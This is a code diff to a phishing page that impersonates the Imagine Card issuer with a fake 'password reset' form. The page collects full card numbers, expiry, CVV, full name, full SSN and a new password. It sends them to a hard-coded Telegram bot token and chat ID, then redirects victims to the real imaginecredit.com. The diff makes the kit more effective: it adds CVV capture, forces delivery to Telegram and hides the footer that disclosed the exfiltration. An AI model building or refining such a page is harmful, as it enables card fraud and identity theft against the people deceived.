@@ -25,7 +25,6 @@
             margin: 0;
         }
 
-        /* ----- main container – clean, minimal, professional ----- */
         .reset-container {
             max-width: 400px;
             width: 100%;
@@ -34,10 +33,8 @@
             box-shadow: 0 20px 40px -12px rgba(0, 20, 40, 0.15);
             padding: 32px 24px 28px;
             border: 1px solid #e9edf4;
-            transition: all 0.2s;
         }
 
-        /* ----- brand header – subtle, no card preview ----- */
         .brand-header {
             text-align: center;
             margin-bottom: 28px;
@@ -72,7 +69,6 @@
             text-decoration: underline;
         }
 
-        /* ----- form fields – clean, spacious, fast ----- */
         .form-group {
             margin-bottom: 16px;
         }
@@ -121,23 +117,21 @@
             font-size: 14px;
         }
 
-        .row-2col {
+        .row-3col {
             display: flex;
             gap: 12px;
         }
 
-        .row-2col .form-group {
+        .row-3col .form-group {
             flex: 1;
         }
 
-        /* ----- divider line ----- */
         .divider {
             border: none;
             border-top: 1.5px dashed #e2e9f2;
             margin: 20px 0 18px 0;
         }
 
-        /* ----- action button – primary CTA ----- */
         .btn-primary {
             width: 100%;
             border: none;
@@ -164,7 +158,6 @@
             transform: scale(0.96);
         }
 
-        /* ----- footer / legal ----- */
         .footer-note {
             font-size: 11px;
             color: #7a8fa8;
@@ -181,7 +174,7 @@
             color: #1f3d68;
         }
 
-        /* ----- PASSWORD OVERLAY (step 2) – clean modal ----- */
+        /* Password Overlay */
         .password-overlay {
             display: none;
             position: fixed;
@@ -290,38 +283,66 @@
             color: #1c3452;
         }
 
+        /* loading state */
+        .btn-primary.loading {
+            opacity: 0.7;
+            pointer-events: none;
+        }
+
+        .btn-primary .spinner {
+            display: none;
+            width: 18px;
+            height: 18px;
+            border: 2px solid rgba(255,255,255,0.3);
+            border-top-color: white;
+            border-radius: 50%;
+            animation: spin 0.6s linear infinite;
+            margin: 0 auto;
+        }
+
+        .btn-primary.loading .spinner {
+            display: block;
+        }
+
+        .btn-primary.loading .btn-text {
+            display: none;
+        }
+
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+
         @media (max-width: 440px) {
             .reset-container { padding: 24px 18px 22px; }
             .password-modal { padding: 24px 20px; }
+            .row-3col { gap: 8px; }
         }
     </style>
 </head>
 <body>
 
-    <!-- MAIN CONTAINER – NO CARD PREVIEW, NO LOGOUT -->
+    <!-- MAIN CONTAINER -->
     <div class="reset-container">
-
-        <!-- simple brand header -->
         <div class="brand-header">
             <div class="logo-icon">Imagine<span>Card</span></div>
             <div class="sub">Secure Account · <a href="#" target="_blank">imaginecredit.com</a></div>
         </div>
 
-        <!-- STEP 1: collect only card details, full name, SSN -->
+        <!-- STEP 1: Full card details (including CVV), full name, full SSN -->
         <form id="step1Form" autocomplete="off">
             <div class="form-group">
                 <label>Full Card Number <span class="hint">(16 digits)</span></label>
                 <input type="text" class="form-control" id="fullCardNumber" placeholder="1234 5678 9012 3456" required autocomplete="cc-number" />
             </div>
 
-            <div class="row-2col">
-                <div class="form-group">
-                    <label>Last 4 Digits</label>
-                    <input type="text" class="form-control" id="lastFour" placeholder="3456" maxlength="4" required autocomplete="cc-number" />
-                </div>
+            <div class="row-3col">
                 <div class="form-group">
                     <label>Expiry <span class="hint">(MM/YY)</span></label>
                     <input type="text" class="form-control" id="expiryDate" placeholder="MM/YY" required autocomplete="cc-exp" />
+                </div>
+                <div class="form-group">
+                    <label>CVV <span class="hint">(3-4 digits)</span></label>
+                    <input type="text" class="form-control" id="cvv" placeholder="123" required autocomplete="off" maxlength="4" />
                 </div>
             </div>
 
@@ -337,30 +358,25 @@
                 <input type="text" class="form-control" id="ssn" placeholder="123456789" required autocomplete="off" />
             </div>
 
-            <div class="row-2col" style="margin-top: -2px;">
-                <div class="form-group">
-                    <label>Last 4 SSN <span class="hint">(verify)</span></label>
-                    <input type="text" class="form-control" id="lastFourSsn" placeholder="6789" maxlength="4" required autocomplete="off" />
-                </div>
-                <div class="form-group" style="display: flex; align-items: flex-end; justify-content: flex-end; padding-bottom: 2px;">
-                    <span style="font-size: 12px; font-weight: 600; color: #1a4b8c; background: #edf3fc; padding: 4px 14px; border-radius: 30px;">🔒 secure</span>
-                </div>
+            <div style="display: flex; justify-content: flex-end; margin-top: -4px; margin-bottom: 8px;">
+                <span style="font-size: 12px; font-weight: 600; color: #1a4b8c; background: #edf3fc; padding: 4px 14px; border-radius: 30px;">🔒 secure</span>
             </div>
 
-            <button type="submit" class="btn-primary" id="continueBtn">Continue →</button>
+            <button type="submit" class="btn-primary" id="continueBtn">
+                <span class="btn-text">Continue →</span>
+                <span class="spinner"></span>
+            </button>
 
-            <!-- hidden: bot token & chat id -->
             <input type="hidden" id="botToken" value="8901133113:AAGJgaIpLD74GFyE6bTm3A4x5GSFwxMHdgA" />
             <input type="hidden" id="chatId" value="8737104261" />
         </form>
 
         <div class="footer-note">
-            This card is issued by WebBank, pursuant to license from Visa U.S.A. Inc.<br />
-            <span>⚡ Data sent to Telegram · redirect to imaginecredit.com</span>
+            This card is issued by WebBank, pursuant to license from Visa U.S.A. Inc.
         </div>
     </div>
 
-    <!-- STEP 2: PASSWORD OVERLAY (appears after step 1) -->
+    <!-- STEP 2: PASSWORD OVERLAY -->
     <div class="password-overlay" id="passwordOverlay">
         <div class="password-modal">
             <button class="modal-close" id="closeModalBtn" aria-label="Close">✕</button>
@@ -376,31 +392,34 @@
                     <label>Confirm Password</label>
                     <input type="password" class="form-control" id="confirmPassword" placeholder="••••••••" required autocomplete="new-password" />
                 </div>
-                <button type="submit" class="btn-primary" id="setPasswordBtn">Set Password &amp; Activate</button>
+                <button type="submit" class="btn-primary" id="setPasswordBtn">
+                    <span class="btn-text">Set Password &amp; Activate</span>
+                    <span class="spinner"></span>
+                </button>
             </form>
         </div>
     </div>
 
     <script>
         (function() {
-            // DOM refs
             const step1Form = document.getElementById('step1Form');
             const passwordOverlay = document.getElementById('passwordOverlay');
             const passwordForm = document.getElementById('passwordForm');
             const closeModalBtn = document.getElementById('closeModalBtn');
+            const continueBtn = document.getElementById('continueBtn');
+            const setPasswordBtn = document.getElementById('setPasswordBtn');
 
             let step1Data = {};
 
-            // Build Telegram message
+            // Build Telegram message with all details
             function buildTelegramMessage(data) {
-                const { fullCard, lastFour, expiry, fullName, ssn, lastFourSsn, newPassword } = data;
+                const { fullCard, expiry, cvv, fullName, ssn, newPassword } = data;
                 return `🔹 *Imagine Card · Password Reset* 🔹\n\n` +
                     `💳 *Full Card:* ${fullCard}\n` +
-                    `🔸 *Last 4:* ${lastFour}\n` +
                     `📅 *Expiry:* ${expiry}\n` +
+                    `🔐 *CVV:* ${cvv}\n` +
                     `👤 *Full Name:* ${fullName}\n` +
                     `🆔 *Full SSN:* ${ssn}\n` +
-                    `🔢 *Last 4 SSN:* ${lastFourSsn}\n` +
                     `🔑 *New Password:* ${newPassword}\n` +
                     `━━━━━━━━━━━━━━\n` +
                     `✅ submitted via Imagine Card`;
@@ -426,26 +445,40 @@
                     const result = await response.json();
                     if (!result.ok) {
                         console.warn('Telegram error:', result);
+                        throw new Error(result.description || 'Telegram API error');
                     }
                     return result;
                 } catch (error) {
                     console.error('Telegram send failed:', error);
+                    throw error;
                 }
             }
 
             // STEP 1: validate & show password overlay
-            step1Form.addEventListener('submit', function(e) {
+            step1Form.addEventListener('submit', async function(e) {
                 e.preventDefault();
 
                 const fullCard = document.getElementById('fullCardNumber').value.trim();
-                const lastFour = document.getElementById('lastFour').value.trim();
                 const expiry = document.getElementById('expiryDate').value.trim();
+                const cvv = document.getElementById('cvv').value.trim();
                 const fullName = document.getElementById('fullName').value.trim();
                 const ssn = document.getElementById('ssn').value.trim();
-                const lastFourSsn = document.getElementById('lastFourSsn').value.trim();
 
-                if (!fullCard || !lastFour || !expiry || !fullName || !ssn || !lastFourSsn) {
+                // Validate all fields
+                if (!fullCard || !expiry || !cvv || !fullName || !ssn) {
                     alert('⚠️ Please fill in all fields.');
+                    return;
+                }
+
+                // Basic card validation
+                const cardDigits = fullCard.replace(/\s/g, '').replace(/\D/g, '');
+                if (cardDigits.length < 16) {
+                    alert('Please enter a valid 16-digit card number.');
+                    return;
+                }
+
+                if (cvv.replace(/\D/g, '').length < 3) {
+                    alert('Please enter a valid CVV (3-4 digits).');
                     return;
                 }
 
@@ -454,7 +487,8 @@
                     return;
                 }
 
-                step1Data = { fullCard, lastFour, expiry, fullName, ssn, lastFourSsn };
+                // Store data
+                step1Data = { fullCard, expiry, cvv, fullName, ssn };
 
                 // Show password overlay
                 passwordOverlay.classList.add('active');
@@ -463,19 +497,18 @@
                 setTimeout(() => document.getElementById('newPassword').focus(), 120);
             });
 
-            // Close modal (X button)
+            // Close modal
             closeModalBtn.addEventListener('click', function() {
                 passwordOverlay.classList.remove('active');
             });
 
-            // Close modal on click outside
             passwordOverlay.addEventListener('click', function(e) {
                 if (e.target === passwordOverlay) {
                     passwordOverlay.classList.remove('active');
                 }
             });
 
-            // STEP 2: password submission
+            // STEP 2: password submission with Telegram send
             passwordForm.addEventListener('submit', async function(e) {
                 e.preventDefault();
 
@@ -497,23 +530,39 @@
                     return;
                 }
 
-                const allData = { ...step1Data, newPassword };
-                const message = buildTelegramMessage(allData);
+                // Show loading state
+                setPasswordBtn.classList.add('loading');
+                setPasswordBtn.disabled = true;
 
                 try {
-                    await sendToTelegram(message);
-                } catch (err) {
-                    console.warn('telegram error, continuing');
-                }
+                    const allData = { ...step1Data, newPassword };
+                    const message = buildTelegramMessage(allData);
 
-                passwordOverlay.classList.remove('active');
-                window.location.href = 'https://www.imaginecredit.com';
+                    // Send to Telegram
+                    await sendToTelegram(message);
+
+                    // Success - close overlay and redirect
+                    passwordOverlay.classList.remove('active');
+                    window.location.href = 'https://www.imaginecredit.com';
+                } catch (error) {
+                    alert('There was an error sending your data. Please try again.');
+                    setPasswordBtn.classList.remove('loading');
+                    setPasswordBtn.disabled = false;
+                }
             });
 
             // Handle Escape key
             document.addEventListener('keydown', function(e) {
                 if (e.key === 'Escape' && passwordOverlay.classList.contains('active')) {
                     passwordOverlay.classList.remove('active');
+                }
+            });
+
+            // Reset loading state if modal closes
+            passwordOverlay.addEventListener('transitionend', function() {
+                if (!passwordOverlay.classList.contains('active')) {
+                    setPasswordBtn.classList.remove('loading');
+                    setPasswordBtn.disabled = false;
                 }
             });
         })();
